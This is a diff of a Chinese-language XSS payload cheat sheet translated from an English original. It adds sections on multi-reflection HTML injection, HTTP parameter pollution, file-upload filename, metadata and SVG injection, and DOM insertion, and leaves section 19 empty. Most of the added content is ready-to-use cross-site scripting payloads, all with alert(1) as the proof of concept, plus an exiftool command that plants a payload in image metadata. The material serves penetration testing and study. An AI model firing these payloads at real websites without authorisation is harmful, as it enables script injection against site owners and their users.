@@ -61,7 +61,7 @@ javascript:alert(1)
 '}alert(1)%0A{'
 \'}alert(1);{//
 ```
-**9.Javascript Injection - Quoteless (javscript注入-无变量名)**
+**9.Javascript Injection - Quoteless (javscript注入-无变量名)** <br>
 
 当输入的payload在同一行javascript代码中有多次反射时使用。<br>
 第一个payload适用于简单的javascript变量，第二个payload适用于非嵌套的javascript对象。 <br>
@@ -69,11 +69,64 @@ javascript:alert(1)
 /alert(1)//\
 /alert(1)}//\
 ```
-**10.Javascript Context - Placeholder Injection in Template Literal (javascript注入-模板文字中的占位符注入)**
-当输入的payload被插入到反引号```（``）```分隔的字符串内或模板引擎中时使用。
+**10.Javascript Context - Placeholder Injection in Template Literal (javascript注入-模板文字中的占位符注入)** <br>
+当输入的payload被插入到反引号```（``）```分隔的字符串内或模板引擎中时使用。<br>
 ```
 ${alert(1)}
 ```
+**11.Multi Reflection HTML Injection - Double Reflection (Single Input) (HTML注入多重反射-双重反射（单输入）)** <br>
+payload用于利用同一页面上的多次反射。<br>
+```
+'onload=alert(1)><svg/1='
+'>alert(1)</script><script/1='
+*/alert(1)</script><script>/*
+```
+**12.Multi Reflection i HTML Injection - Triple Reflection (Single Input) (HTML注入多重反射-三次反射（单输入）)** <br>
+payload用于利用同一页面上的多次反射。<br>
+```
+*/alert(1)">'onload="/*<svg/1='
+`-alert(1)">'onload="`<svg/1='
+*/</script>'>alert(1)/*<script/1='
+```
+**13.Multi Input Reflections HTML Injection - Double & Triple (HTML注入多输入反射-两次和三次)** <br>
+payload用于利用同一页面上的多个输入反射。在HPP（HTTP参数污染）其中存在重复参数的反射。 第三个payload利用相同参数的逗号分隔进行反射。<br>
+```
+p=<svg/1='&q='onload=alert(1)>
+p=<svg 1='&q='onload='/*&r=*/alert(1)'>
+q=<script/&q=/src=data:&q=alert(1)>
+```
+**14.File Upload Injection – Filename (文件上传注入-文件名)** <br>
+payload用于用户上传的文件名返回在目标页面的某处时使用。
+```
+"><svg onload=alert(1)>.gif
+```
+**15.File Upload Injection – Metadata (文件上传注入-元数据)** <br>
+payload用于，当上传文件的元数据返回在目标页面中的某处时使用。 它可以使用命令行exiftool（"$"是终端提示），并且可以设置任何元数据字段。
+```
+$ exiftool -Artist='"><svg onload=alert(1)>' xss.jpeg
+```
+**16.File Upload Injection – SVG File (文件上传注入-SVG文件)** <br>
+上传图像文件时，用于在目标上创建存储的XSS payload。 将以下内容另存为"xss.svg"文件 <br>
+```
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
+```
+**17.DOM Insert Injection (DOM 注入)** <br>
+当注入的payload作为有效标记插入DOM中，而不是反映在源代码中时，用于测试XSS。<br>
+它适用于html标签和其他payload无效的情况下使用。<br>
+```
+<img src=1 onerror=alert(1)>
+<iframe src=javascript:alert(1)>
+<details open ontoggle=alert(1)>
+<svg><svg onload=alert(1)>
+```
+**18.DOM Insert Injection – Resource Request (DOM 注入-资源请求)** <br>
+当网站调用本地的javascript代码发送请求，并且将请求的结果插入到页面中时，如果攻击者可以控制该URL。则可以使用以下payload进行测试 <br>
+```
+data:text/html,<img src=1 onerror=alert(1)>
+data:text/html,<iframe src=javascript:alert(1)>
+```
+**19.PHP Self URL Injection (PHP self URL注入)** <br>
+
 
 ## 致谢
 **英文议题作者：** <br>
